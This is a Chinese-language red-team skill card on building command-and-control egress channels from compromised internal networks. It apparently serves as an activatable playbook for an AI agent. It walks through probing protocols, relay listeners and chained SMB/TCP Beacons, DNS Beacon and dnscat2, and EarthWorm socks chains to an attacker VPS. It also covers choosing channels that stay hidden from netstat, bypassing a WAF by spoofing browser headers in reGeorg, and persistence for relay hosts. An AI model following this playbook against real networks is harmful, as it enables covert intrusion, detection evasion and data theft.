# C2 出网通道与隧道基础设施

## R — 原文 (Reading)

> this protocol doesn't show an ESTABLISHED state when monitoring active connections using netstat, which gives it a stealthier C2 channel.

> — 《Hands-On Red Team Tactics》· 第 10 章 C2 – Master of Puppets · C2 covert channels

> 项目特点是内网服务器对外只能通 DNS 协议。

> — 163 酒仙桥六号部队《从 DNS Beacon 到域控》· 利用 DNS Beacon 弹 shell

> 场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80, 443）……思路二则是端口转发，将内网主机的某些服务的端口转发到外网攻击主机上的防火墙允许的特定端口上。

> — 《域渗透一条龙》· 15. 内网穿透（0x01 场景与思路分析）

## I — 方法论骨架 (Interpretation)

这个能力解决的是「打进去了、但会话不上线」这一类最消耗时间的问题。核心认知是：**「能出网」和「能回连 C2」是两件事**，而且判断顺序必须是「先压缩协议空间，再选工具」，不能反过来。

三层判断，从下往上：

**第一层：出口策略（哪种协议能出去）。** 每一个协议探测失败，就排除一整个通道族：

| 探测 | 失败意味着排除 |
|---|---|
| `ping` 公网域名 | ICMP 与依赖 ICMP 反馈的探测 |
| `curl` 外网地址 | HTTP(S) beacon、webshell 回连、域前置 |
| 裸 TCP 反弹 | 常规反向 shell / meterpreter / CS 反向木马 |
| `nslookup` 域名 | DNS 隧道（DNS Beacon、dnscat2） |

顺序的价值在于：不用猜「木马为什么不上线」，而是先用最小成本把可用协议压缩到一个。剩下只有 53 端口解析行为时，可用通道就只有 DNS 类——而 DNS 通道的带宽极低，用它传大文件会拖死整个行动。

**第二层：谁代表内网出网（拓扑）。** 内网深处的主机往往没有出网能力，给它下发指向公网 VPS 的 payload 必然失败。解法是把「出网」这件事收敛到一台已经出网的机器上：

- **中继监听**：在已控且能出网的主机上新建 listener，后续 payload 的 C2 地址填该主机的**内网 IP**，受害机只与内网中继通信，中继再转发出去。注意中继会话是**被动连接**——不操作就不回连，容易被误判为掉线；中继主机重启或会话断开，挂在其下的所有子会话一起消失，所以中继机必须先做权限维持。
- **对等 Beacon**：不出网网段先在可出网主机落父 Beacon，再用 SMB Beacon（`link [host] [pipe]`）或 TCP Beacon（`connect [ip] [port]`）逐跳挂接，形成「一条出口、多条内链」。SMB Beacon 要求目标 445 可连，且只能被同一 C2 实例管理的 Beacon 链接。

**第三层：在出口上用什么形态（工具与协议特性）。**

- **C2 协议选型按「痕迹形态」而不是「能不能通」**：TCP 连接导向、能混在大量 TCP 中，但 `netstat` 的 `ESTABLISHED` 会直接暴露对端、端口乃至红队网段；UDP 无连接、不留 `ESTABLISHED`，更隐蔽但难写稳定；HTTP(S) 因 80/443 默认放行而最「通行」；DNS 几乎所有管理都依赖、无需记 IP，QUERY/RESPONSE 即可承载数据；ICMP 常被允许用于探活，可把载荷塞进头部填充。核心判据是「这条信道在防守方的常规视图里长什么样」。
- **隧道工具按「公网可达性」选**：任意端口放行 → 直接反弹/socks；仅 80/443 → 改端口或端口转发；TCP 完全不出网但 HTTP 通 → HTTP 隧道（reGeorg/pystinger，把 webshell 当传输层）；只有 DNS → DNS 隧道。反向转发（`ssh -R`、`lcx -slave`）存在的理由是「A 连不上 B，但 B 能连 A」。
- **多级链路**：EW 只有两类原语——`ssocksd`（本机开正向 socks5）与 `rsocksd`（反连出去），加三种 lcx 管道把「请求方」和「代理提供方」缝起来。有公网 IP 就开正向；无公网 IP 就必须让内网机主动连出，由 VPS 的 `lcx_listen` 接住，再用 `lcx_slave` 缝到内网代理端口。

一条纪律贯穿三层：**连接能通不代表链路可用**。HTTP 隧道脆弱（断线需 kill 进程重启客户端）；远程端口转发默认只绑 127.0.0.1（需 `GatewayPorts yes` 才能被外部访问，这一点最容易被误判为「转发失败」）；只有 socks4 的环境里 nmap 必须加 `-sT -Pn`，否则全部显示 down。工具可用性必须现场验证，不能按文章照抄——同一批案例里作者实测 reGeorg 与 EarthWorm 都「存在一定问题」，改用 venom 才通。

## A1 — 应用示例 (Application Example)

### 示例 1: 逐协议探测后锁定 DNS 出网
- **类型与来源**: 【亲历】163 酒仙桥六号部队《从 DNS Beacon 到域控》；《从网关进入内网到 DNS 协议出网》
- **问题/输入**: 通过 Web 入口拿到命令执行，投 HTTP beacon 长时间不上线。
- **方法论的使用**: `ping` 公网域名 → 通；`curl` 外网地址 / 用冰蝎自带 socks5 → 判断 HTTP(S) 与 TCP 出站；直接 msf 反弹 tcp → 失败，说明反向 shell 族不可用；`nslookup` → 只有 53 端口解析行为。判定「仅 DNS 出网」，改用 DNS Beacon（`mode dns-txt`）或 dnscat2，并按域名 A/NS 记录配置权威解析；`--dns domain` 必须填域名，填 IP 不通。
- **结论**: 每失败一种协议就排除一整个通道族，最后只剩 DNS 时不需要再猜「为什么木马不上线」。
- **结果**: 原书交代用 DNS Beacon + `mode dns-txt` 拿到会话。

### 示例 2: 用可出网主机做中继监听
- **类型与来源**: 【亲历】163 酒仙桥六号部队《从 DNS Beacon 到域控》· 内网中继横向渗透；《内网横向移动学习备忘录》· 01 环境介绍
- **问题/输入**: 内网所有机器对外只通 DNS，数据库服务器与 Web 服务器之间互通，但数据库服务器不出网。
- **方法论的使用**: 确认 Web 服务器能出网（ping/curl 通）→ 该机可当中继；在这台主机上新建 listener（CS 中按主机建监听器），拿到指向**内网 IP** 的 payload；用任意执行手段（wmic/schtasks/xp_cmdshell）让目标下载并执行 → 目标出现在中继主机的会话列表里。
- **结论**: 把出网收敛到一台机器上，其余主机只在三层内网里活动；代价是中继机成为单点，必须先做权限维持。
- **结果**: 原书交代数据库服务器的 shell 弹回中继机；并注明中继会话的被动特性（不操作就不回连）。

### 示例 3: 无公网 IP 环境下的 EW 两级缝接
- **类型与来源**: 【亲历】163 酒仙桥六号部队《内网渗透之代理转发》· 6.3 / 6.4
- **问题/输入**: 已控 A（可出网/双网卡）与 B（可达目标网段），边界机器没有公网 IP。
- **方法论的使用**: VPS 上 `./ew_for_linux64 -s lcx_listen -l 10800 -e 8888`（把 10800 收到的请求转给 8888）；B 机 `./ew_for_Win.exe -s ssocksd -l 9999` 开正向代理；A 机做缝接 `./ew_for_Win.exe -s lcx_slave -d <VPS> -e 8888 -f <B内网IP> -g 9999`；本地连 `VPS:10800` 使用 socks5。完成判据是 VPS 侧出现 `rssocks cmd_socket OK!`。
- **结论**: 无公网 IP 时不能让外部连进来，只能让内网机主动连出，再用管道把 VPS 入口与内网代理端口缝起来。
- **结果**: 原书交代两套拓扑（有公网 IP / 无公网 IP）均复现；同批文章另一次 reGeorg 与 EarthWorm 均失败、改 venom `socks 7878` 才通，作者据此强调工具可用性必须现场验证。

### 示例 4: reGeorg「未准备好」——403 二分定位
- **类型与来源**: 【亲历】163 酒仙桥六号部队《reGeorg 实战攻防》
- **问题/输入**: 目标 ACL 只放行 HTTP/HTTPS，tunnel 文件已落地，浏览器能打开但脚本报「未准备好，请检查 url」。
- **方法论的使用**: 浏览器直接访问 `tunnel.jsp` → 显示 "All seems fine"，排除文件部署与解析问题；在 `askGeorg` 附近加打印 → 实际返回 403 而非 200，判定被 WAF 拦（只认 200 + 特定内容）；抓浏览器请求，提取 UA、Accept-Language 等头，封装成函数，在 CONNECT/READ/FORWARD/DISCONNECT **各环节**统一附加；重跑后返回码变 200。
- **结论**: 差异不在 tunnel 文件，而在请求特征；只改一处（如只改 UA）后续请求仍会被拦。
- **结果**: 原书交代恢复连接；同时指出把 403 当「tunnel 被杀」而反复重传文件，是浪费入口暴露次数的典型误判。

## A2 — 触发场景 (Future Trigger) ★

### 用户会在什么情境下需要它
1. 木马/beacon 一直不上线，需要判断是出口、拓扑还是载荷问题。
2. 内网深处主机不出网，需要选「中继监听」还是「对等 Beacon」。
3. 需要在一个只放行 80/443（或只有 DNS）的环境里建通道。
4. 要搭多级代理，但边界机器没有公网 IP。
5. 隧道通了但代理不可用（nmap 全 down、浏览器打不开），需要定位是链路问题还是客户端配置。

### 语言信号（出现这些就该激活）
- 中文：「打进去了但木马一直不上线」「目标只能出 DNS」「内网机器不出网」「跳板机做中转」「二层内网怎么代理出来」「没有公网 IP 怎么做 socks」「C2 用哪个协议」「DNS 隧道还是 HTTPS」「reGeorg 未准备好」
- English: "beacon never checks in", "only DNS egress works", "pivot listener", "chain two pivots", "which C2 channel", "dns vs https beacon", "regeorg 403"

### 与相邻能力的区分
- 与 `evasion-and-opsec` 的区别：那张卡管「通道选定后怎么控体量、怎么防溯源（重定向器、host_stage）」；本卡管「哪条通道能成立、拓扑怎么搭」。
- 与 `lateral-execution-channels` 的区别：本卡是网络层（流量怎么回去），那张卡是 OS 层（命令怎么送过去）。两者常叠加（C2 over tunnel）。
- 与 `domain-recon-path` 的区别：那张卡在出网能力已知的前提下做域内侦察；本卡的出口探测结果会改变那张卡能用的手段（例如只有 DNS 时只能用 DNS 类工具投递）。

## E — 可执行步骤 (Execution)

**必需输入**: ①一个可执行命令的据点；②一个外部可控 VPS（或可复用的已控主机）；③目标网段拓扑（哪些机器双网卡、互相是否可达）；④objective（要交互式会话 / 只要一次性回连 / 要稳定代理）。缺 ③ 时先做第 2 步的拓扑判定。
**交付物与完成标准**: 一份「通道拓扑图 + 探测记录」：图上标出「哪台机器出网、走什么协议、经几跳、谁是单点」；探测记录逐协议写通/不通。完成标准是会话或代理可用，且拓扑里的单点已被标注（并决定是否先做持久化）。

1. **逐协议探测出口（先做，不要先换工具）**
   - 做什么：`ping <公网域名>`、`curl <外网地址>`、`nslookup <域名>`、直接反弹一个 TCP 到 VPS 的高位端口。
   - 完成标准：一张「协议 → 通/不通」的表。
   - 判停：若 ICMP/HTTP/TCP 全不通只有 DNS 通，直接进第 4 步的 DNS 分支，不要再试常规木马。

2. **判拓扑：谁是出口**
   - 做什么：`ipconfig /all` / `route print` 看有几张网卡、能到哪些网段；从每台已控主机分别做第 1 步的探测，标出「可出网 + 可达目标网段」的机器。
   - 完成标准：找到至少一台双网卡或可出网主机。
   - 判停：若没有任何一台能出网，本卡整体不成立——只能做纯内网横向，等拿到能出网的机器再回来。

3. **选拓扑：中继 vs 对等**
   - 做什么：目标与某台已控机互通且那台能出网 → 中继监听（在该机建 listener，payload 填其内网 IP）；目标是内网深处且有 445 互通 → SMB Beacon 挂到父 Beacon；无 445 但有 TCP 互通 → TCP Beacon。
   - 完成标准：写下「谁出网、谁是父、谁是子」。
   - 判停：若中继机是单点且未做维持，先转 `endpoint-persistence` 做冗余——中继机重启会让所有子会话一起消失。

4. **按出口选协议形态**
   - 做什么：能直连 80/443 → HTTP(S)；只有 DNS → DNS Beacon（按出口策略在 TXT/AAAA/A 之间切换）或 dnscat2（`--dns domain` 填域名，不能填 IP）；只有 ICMP → ICMP 隧道；TCP 可出但 HTTP 不通 → 自有 TCP 管道。
   - 完成标准：选定的协议与探测表一致。
   - 判停：若带宽需求大而只剩 DNS/ICMP，先降低需求（只发小指令与心跳），不要把大文件压到低带宽通道上。

5. **搭隧道（只放行 HTTP 或需要多级时）**
   - 做什么：仅 HTTP → reGeorg/pystinger（把 webshell 当传输层）；需要 socks 且无公网 IP → EW 的 `lcx_listen` + `ssocksd` + `lcx_slave` 三件套，或 `ssh -R` 反向转发（注意 `GatewayPorts yes`）；有公网 IP → 直接 `ssocksd` 开正向。
   - 完成标准：本地能通过代理访问目标内网资源（不是「端口通了」，而是「能取到内容」）。
   - 判停：若只有 socks4 环境，nmap 必须加 `-sT -Pn`，否则全 down；若 HTTP 隧道断线，需 kill 客户端进程重启（不能指望自愈）。

6. **排障：二分「哪一层断了」**
   - 做什么：①文件层——浏览器直访 tunnel 文件是否返回正常内容；②请求特征层——打印客户端看到的真实状态码（403 = 被 WAF 按请求头拦）；③代理层——本地直连代理端口看是否握手；④路由层——从跳板机反连目标端口。
   - 完成标准：定位到唯一一层。
   - 判停：若打印出 403，补齐浏览器头（UA、Accept-Language 等）并**在所有环节**统一附加，而不是只改一处；不要把 403 当「文件被杀」反复重传（浪费暴露次数）。

7. **收敛出网源，压缩流量**
   - 做什么：让只有一台机器出网，其余走内链；交互与休眠通道分开（留两条：一条交互、一条备用）；避免每台机器都直接回连。
   - 完成标准：拓扑图上「出网点」数量为 1（或明确的最小数）。
   - 判停：若多个出网点无法避免，至少让它们走不同基础设施，否则一个被封等于全断（具体基础设施隔离见 `evasion-and-opsec`）。

8. **记录与交接**
   - 做什么：画出拓扑（含每跳协议、端口、单点）；标注每个通道的带宽与稳定性；交给后续行动使用。
   - 完成标准：换人接手能照着图重建链路。
   - 判停：若拓扑超过三跳且中间某跳不稳定，考虑重建更短路径——多级跳板叠加会让链路不稳且排障成本指数上升。

## B — 边界 (Boundary) ★

### 不要用的情况
- 目标有全流量解密 + 应用识别（下一代防火墙做 TLS 检查）：HTTP(S) 通道的「混在正常流量里」假设失效。
- 出口只允许经代理且代理强制认证：自有协议与自建端口全部不可用，只剩「借业务系统做传输层」这一条。
- 目标禁止外发 DNS（只允许内网解析器转发且做查询类型白名单）：DNS 隧道不可用。
- 需要传大文件：DNS/ICMP/HTTP 隧道都不适合，应改用分片 + 业务通道，或放弃外带只做截图取证。

### 已知失败模式
- **不做协议探测就直接投 HTTP beacon**：长时间不上线后被误判为「木马不免杀」或「目标不可达」，把时间浪费在免杀上。
- **中继会话被误判为掉线**：中继会话是被动连接，不操作就不回连。
- **中继机重启导致子会话全失**：中继是单点，未做维持就等于没有冗余。
- **DNS 通道传大文件**：带宽极低，会拖死整个行动。
- **`--dns domain` 填 IP**：dnscat2 类工具必须填域名。
- **SMB Beacon 前提错**：要求目标 445 可连，且只能被同一 CS 实例管理的 Beacon 链接。
- **远程端口转发只绑 127.0.0.1**：没设 `GatewayPorts yes` 却被判定为「转发失败」。
- **socks4 环境用默认 nmap**：不支持 ICMP/UDP，全部显示 down，误判「主机全死」。
- **只改一处请求头就以为绕过 WAF**：READ/FORWARD 环节仍被拦。
- **把 403 当文件被杀**：反复重传 tunnel 文件，暴露次数被浪费。
- **设全局代理**：无关流量涌入隧道，放大暴露面且拖慢链路。

### 作者与时代的局限
- 案例基于 2019–2021 年的 CS 4.0、EW、reGeorg、venom。当前环境：EDR 对 Beacon 内存特征、对 `ssocksd`/`lcx` 的网络指纹已有成熟规则；EW 与 reGeorg 的默认流量特征基本必被抓；pystinger/venom 的维护活跃度也下降。
- 现代出口策略更多是「默认拒绝 + 应用白名单 + TLS 检查 + 代理强制认证」，书中「80/443 默认放行」的假设在零信任网络里不成立。
- 未覆盖 DoH/DoT 普及后的 DNS 隧道困境：明文 53 端口在很多网络被完全阻断，而 DoH 走 443 又被应用识别覆盖。
- 未讨论云环境（AWS/GCP）的出口：NAT 网关 + VPC 流日志让「出网点收敛」这件事本身可被检测。

### 容易混淆的方法
- **协议探测 vs 工具选型**：前者回答「哪种协议能出去」，后者回答「用哪个工具做二级链路」。顺序不能反。
- **中继监听 vs 对等 Beacon**：前者是 C2 会话拓扑（子会话挂在能出网的主机上），后者是 Beacon 间的链接（SMB/TCP 管道）。两者可以叠加。
- **C2 通道 vs 操作系统隧道**：C2 通道是「Beacon 用什么协议回去」，隧道是「把内网端口映射出来」。同一环境里常同时存在（C2 over tunnel）。
- **域前置 vs 重定向器**：域前置解决域名层可见性（HTTP 可用时的伪装），重定向器解决 IP 层可达性（见 `evasion-and-opsec`）。
